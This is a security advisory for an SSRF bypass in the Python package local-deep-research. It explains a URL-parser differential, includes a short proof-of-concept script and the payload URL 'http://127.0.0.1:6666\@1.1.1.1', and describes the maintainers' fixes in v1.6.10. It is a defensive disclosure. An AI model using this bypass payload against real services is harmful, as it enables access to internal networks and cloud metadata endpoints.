# [M] local-deep-research has an SSRF bypass in `safe_get`

## Summary
Severity: Medium
Advisory: GHSA-g23j-2vwm-5c25
CVE: CVE-2026-46526
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-28
Source: https://github.com/advisories/GHSA-g23j-2vwm-5c25
Type: github-advisory

## Affected
- PyPI: `local-deep-research` — affected >=0 <1.6.10

## Details
### Summary
The URL checking logic in local-deep-research has a logical flaw that could be bypassed by attackers, leading to SSRF attacks.

### Details
The current project uses `validate_url` to validate the input URL. The main logic is to perform security checks on the host portion of the URL extracted by urlparse to prevent SSRF attacks.

<img width="1173" height="1107" alt="QQ20260430-212334-30-1" src="https://github.com/user-attachments/assets/52b356aa-9ad3-4b1d-a472-39a2ada3ea23" />

However, there are indeed differences in parsing between urlparse and the library that actually sends the request. For example, in `safe_get`, `validate_url` is first used to perform an SSRF check, and then `requests.get` is used to send the actual request.

<img width="1164" height="1089" alt="QQ20260430-212431-30-2" src="https://github.com/user-attachments/assets/f3decb16-4daa-49e0-861c-273a913487a0" />

The core issue: urlparse() and requests disagree on which host a URL like `http://127.0.0.1:6666\@1.1.1.1` points to:

- urlparse() treats \ as a regular character and @ as the userinfo-host delimiter, so it extracts hostname as `1.1.1.1` (public)
- requests treats \ as a path character, connecting to `127.0.0.1` (internal)

Below is a test code I wrote following the code.
```
#!/usr/bin/env python3
"""Standalone demo: import project via absolute path and call safe_get."""

from __future__ import annotations

import importlib.util
import enum
import sys
import types
from pathlib import Path

# Hardcoded absolute path to the project's "src" directory.
SRC_ROOT = Path(
    r"d:\BaiduNetdiskDownload\local-deep-research-main\local-deep-research-main\src"
)

# Python 3.10 compatibility:
# project constants import StrEnum (available in Python 3.11+).
if not hasattr(enum, "StrEnum"):
    class _CompatStrEnum(str, enum.Enum):
        pass

    enum.StrEnum = _CompatStrEnum  # type: ignore[attr-defined]


def _load_safe_get():
    """Load safe_get directly from file, bypassing package __init__ imports."""
    ldr_pkg_name = "local_deep_research"
    security_pkg_name = "local_deep_research.security"

    # Build lightweight package modules so relative imports in safe_requests.py
    # resolve without executing package __init__.py files.
    if ldr_pkg_name not in sys.modules:
        ldr_pkg = types.ModuleType(ldr_pkg_name)
        ldr_pkg.__path__ = [str(SRC_ROOT / "local_deep_research")]  # type: ignore[attr-defined]
        sys.modules[ldr_pkg_name] = ldr_pkg

    if security_pkg_name not in sys.modules:
        security_pkg = types.ModuleType(security_pkg_name)
        security_pkg.__path__ = [str(SRC_ROOT / "local_deep_research" / "security")]  # type: ignore[attr-defined]
        sys.modules[security_pkg_name] = security_pkg

    module_name = "local_deep_research.security.safe_requests"
    module_path = SRC_ROOT / "local_deep_research" / "security" / "safe_requests.py"

    spec = importlib.util.spec_from_file_location(module_name, module_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"Cannot load module from {module_path}")

    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module.safe_get


safe_get = _load_safe_get()


def main() -> None:
    # Hardcoded URL for demonstration.
    url = "http://127.0.0.1:6666"
    # url = "http://127.0.0.1:6666\@1.1.1.1"

    safe_get(url, timeout=15)


if __name__ == "__main__":
    main()
```
When an attacker uses `http://127.0.0.1:6666/`, the existing detection logic can detect that this is an internal network address and block it.

<img width="1694" height="503" alt="QQ20260430-212723-30-3" src="https://github.com/user-attachments/assets/366f684d-9191-4acb-b6a2-b2c3c54f0223" />

However, when an attacker uses `http://127.0.0.1:6666\@1.1.1.1`, the detection logic resolves the host to `1.1.1.1`, which is a public IP address, thus passing the verification. But in the actual request process, this URL is forwarded by requests.get to `http://127.0.0.1:6666`, bypassing the detection and achieving an SSRF attack.

<img width="2424" height="477" alt="QQ20260430-212833-30-4" src="https://github.com/user-attachments/assets/bd175e34-d833-44c5-981b-59cfad3406c3" />

### PoC
```
http://127.0.0.1:6666\@1.1.1.1
```

### Impact
SSRF



---

## Maintainer note (2026-05-15)

Thanks @Fushuling and @RacerZ-fighting for the detailed report. The remediation
spans four PRs, all merged to `main` and shipped in **v1.6.10**:

**#3873** (merged 2026-05-08) — the load-bearing fix for the parser-differential
bypass:
- New `RFC_FORBIDDEN_URL_CHARS_RE` in `security/ssrf_validator.py` rejects
  URLs containing backslash, ASCII control bytes, or whitespace — RFC 3986
  forbids these and their presence signals a parser-differential attempt.
- Host extraction switched from `urllib.parse.urlparse(url).hostname` to
  `urllib3.util.parse_url(url).host`. `urllib3` is the parser `requests`
  uses internally, so the validator and the HTTP client now agree on the
  destination by construction — closing the `\@` divergence that drove the
  PoC.
- Same two-layer defence applied to `NotificationURLValidator.validate_service_url`.
- 53 new tests across `test_ssrf_validator.py`, `test_notification_validator.py`,
  `test_safe_requests.py`, and `test_ssrf_redirect_bypass.py`, including the
  advisory PoC `http://127.0.0.1:6666\@1.1.1.1` and the post-prepare canonical
  form `http://127.0.0.1:6666/%5C@1.1.1.1`.

**#3882** (merged 2026-05-08) — hardens the metadata-IP block and redacts
userinfo from log output so rejected URLs don't leak credentials to logs.

**#3889** (merged 2026-05-09) — locks in real-world URL fixtures and behavior
invariants from #3873/#3882 as regression tests.

**#3932** (merged 2026-05-10) — blocks IPv6 transition prefixes (`2002::/16`
6to4, `64:ff9b::/96` NAT64, `2001::/32` Teredo, `100::/64` discard) so private
IPv4 destinations cannot be reached via an IPv6-wrapped form. NAT64 has an
operator opt-in (`LDR_SECURITY_ALLOW_NAT64=true`) for IPv6-only deployments,
but cloud metadata IPs remain blocked regardless.

### Affected versions

- **The specific parser-differential bypass** described above exists from
  **v1.3.0** (when `validate_url` was first introduced) through **v1.6.9**.
  The validator used `urlparse(url).hostname` for that entire span.
- **Versions before v1.3.0** had no SSRF validator at all — requests went
  directly to `requests.get()` without any host check. Those versions are
  vulnerable to SSRF via this URL and any other internal address; the
  parser-differential trick is unnecessary.

In both cases the remediation is the same: **upgrade to v1.6.10 or later.**

## References
- https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-g23j-2vwm-5c25
- https://nvd.nist.gov/vuln/detail/CVE-2026-46526
- https://github.com/LearningCircuit/local-deep-research/pull/3873
- https://github.com/LearningCircuit/local-deep-research/pull/3882
- https://github.com/LearningCircuit/local-deep-research/pull/3889
- https://github.com/LearningCircuit/local-deep-research/pull/3932
- https://github.com/LearningCircuit/local-deep-research
- https://github.com/LearningCircuit/local-deep-research/releases/tag/v1.6.10
